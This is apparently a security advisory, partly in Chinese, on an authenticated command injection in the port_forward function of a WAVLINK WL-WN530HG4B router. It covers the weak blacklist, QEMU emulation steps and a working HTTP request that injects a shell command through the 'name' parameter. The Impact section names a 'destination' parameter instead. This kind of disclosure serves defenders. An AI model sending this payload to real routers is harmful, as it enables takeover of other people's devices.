# WAVLINK WL-WN530HG4B Router

Vendor: WAVLINK

Product: WL-WN530HG4B

Firmware Version: M_V260724

Vulnerability Type:Authenticated Command Injection

# Description

The vulnerability exists in the `port_forward` function, which primarily applies blacklist-based filtering to incoming parameters. However, the filtering is not strict enough, leaving many  exploitable characters still available. Following the execution flow, we eventually reach the controllable `name` parameter, which can be crafted. The input is first copied via `strncpy`, then concatenated into a command string via `snprintf`, and finally executed via `popen`, ultimately achieving remote code execution.

## Impact

An authenticated attacker can inject arbitrary shell commands through the `destination` parameter and execute them with the privileges of the web service, potentially resulting in full compromise of the device.

## Vulnerability Details

Upon entering the `port_forward` function (`sub_405C1C`), after passing authentication and Referer verification, the execution flow proceeds further. Following the `function=set` branch, other parameters are populated sequentially until reaching the `name` parameter, which is user-controllable. Subsequently, the input string passed to `name` is subjected to validation. However, the validation only checks for backticks (```) and semicolons (`;`), leaving other exploitable characters such as `|` and `>` unfiltered. Ultimately, the flow reaches the following sequence:

- `strncpy(v53, v25, 31);`
- `snprintf(v48, 128, "uci show firewall|grep %s |awk -F '.' {'print $2'}", v53);`
- `v46 = popen(v48, "r");`
  This leads to command injection.

# 固件模拟

```
# qemu模拟
qemu-system-mipsel \
        -M malta \
        -cpu 74Kf\
        -kernel /home/iotsec-zone/Desktop/Tools/qemu-images/mipsel/vmlinux-3.2.0-4-4kc-malta \
        -hda /home/iotsec-zone/Desktop/Tools/qemu-images/mipsel/debian_wheezy_mipsel_standard.qcow2 \
        -append "root=/dev/sda1 console=ttyS0" \
        -net nic -net tap,ifname=tap0,script=no,downscript=no \
        -nographic
 
 # 宿主机网卡配置
sudo tunctl -t tap0 -u `whoami`
sudo ifconfig tap0 192.168.10.1/24 up


# 虚拟机网卡配置
ip link add br0 type dummy
ifconfig eth0 192.168.10.2/24
ifconfig br0 192.168.10.3/24

#网络配置后传输文件系统上去
#宿主机进行压缩
tar -cvf web.tar.gz squashfs-root/
python -m http.server 1314

#虚拟机接收并解压
wget http://192.168.10.1:1314/web.tar.gz
tar -xvf web.tar.gz


# 系统环境的配置
cd squashfs-root
mount --bind /proc/ proc/
mount --bind /sys/ sys/
mount --bind /dev/ dev/



chroot . sh
./usr/sbin/uhttpd -f -h /etc/ws_web/www/ -p 0.0.0.0:8080 -x /cgi-bin -I login.html
```

![image-20260806151112363](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806151112363.png)

完成初始化操作后

![image-20260806151604100](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806151604100.png)

# 漏洞分析



sub_405C1C

检测是否登录和referer来源

![image-20260806153639331](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806153639331.png)

![image-20260806153717174](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806153717174.png)

![image-20260806153723077](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806153723077.png)

对传入的name进行黑名单检测但是只检测了反引号和分号

![image-20260806153850199](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806153850199.png)

最后触发在popen执行

# 漏洞执行

```http
POST /cgi-bin/wapi.cgi?x=1&opt=port_forward&function=set&act=add&ip=1.1.1.1&out_port=80&in_port=80&proto=tcp&name=|%20echo%20get_shell%20>/shell HTTP/1.1

Host: 192.168.10.3:8080

Content-Length: 0

Accept: application/json, text/javascript, */*; q=0.01

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

X-Requested-With: XMLHttpRequest

Origin: http://192.168.10.3:8080

Referer: http://192.168.10.3:8080/main.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: lstatus=true; lang_sel=true; i18next=zh_CN; token=5E51163D32B247732E77959F16587148

Connection: close
```

先登录获取有效cookie，再发送burp即可

![image-20260806154218075](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806154218075.png)

![image-20260806154229984](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260806154229984.png)
